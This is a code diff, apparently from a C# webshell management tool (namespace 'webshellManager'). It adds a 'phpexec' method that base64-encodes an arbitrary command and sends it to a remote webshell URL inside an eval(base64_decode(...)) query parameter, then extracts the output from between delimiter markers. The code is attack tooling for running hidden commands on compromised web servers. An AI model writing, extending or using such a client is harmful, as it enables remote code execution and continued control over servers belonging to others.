@@ -235,6 +235,20 @@ namespace webshellManager
             return (matched[0].Groups[1].Value);
         }
 
+        public string phpexec(string command)
+        {
+            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes("echo \"-¤-\";" + Environment.NewLine + command + Environment.NewLine +"echo \"-¤-\";");
+            command = System.Convert.ToBase64String(plainTextBytes);
+            string result = client.DownloadString(this.URL + "?" + this.variable + "=eval(base64_decode(\"" + command + "\"));");
+            if (result.Contains("-¤-"))
+            {
+                MatchCollection matched = Regex.Matches(result, "-¤-(.*?)-¤-", RegexOptions.Singleline);
+                Console.WriteLine(matched[0].Groups[1]);
+                return (matched[0].Groups[1].Value);
+            }
+            return "error.";
+        }
+
         public void setUrl(string pAddress)
         {
             this.URL = pAddress;
